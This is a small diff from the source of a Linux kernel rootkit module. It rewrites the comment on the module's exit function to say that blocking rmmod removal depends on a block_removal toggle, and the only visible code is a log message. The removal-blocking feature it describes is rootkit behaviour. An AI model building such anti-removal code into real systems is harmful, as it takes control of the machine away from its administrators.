@@ -244,7 +244,9 @@ static int __init rootkit_init(void) {
 }
 
 /**
- * Called when $ rmmod is executed. This function stops the rootkit from being removed.
+ * Called when $ rmmod is executed. If block_removal is toggled on, this
+ * function stops the rootkit from being removed. If it is not enabled,
+ * the rootkit is cleaned up nicely.
  */
 static void __exit rootkit_exit(void) {
 	printk(KERN_INFO "rmmod called. Cleaning up rootkit.");
